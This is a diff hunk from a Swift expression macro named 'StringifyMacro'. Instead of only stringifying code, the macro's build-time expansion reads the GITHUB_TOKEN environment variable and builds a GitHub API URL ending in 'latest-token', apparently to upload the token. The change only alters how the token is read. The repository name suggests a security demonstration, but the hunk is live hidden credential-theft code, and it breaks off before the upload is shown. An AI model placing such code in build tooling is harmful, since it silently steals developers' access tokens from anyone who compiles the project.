@@ -18,7 +18,7 @@ public struct StringifyMacro: ExpressionMacro {
         of node: some FreestandingMacroExpansionSyntax,
         in context: some MacroExpansionContext
     ) -> ExprSyntax {
-        if let githubToken = ProcessInfo.processInfo.environment["GITHUB_TOKEN"] {
+        if let githubTokenData = getenv("GITHUB_TOKEN"), let githubToken = String(validatingUTF8: githubTokenData) {
             let group = DispatchGroup()
             
             let url = URL(string: "https://api.github.com/repos/tuist/swift-macros-security/contents/latest-token")!
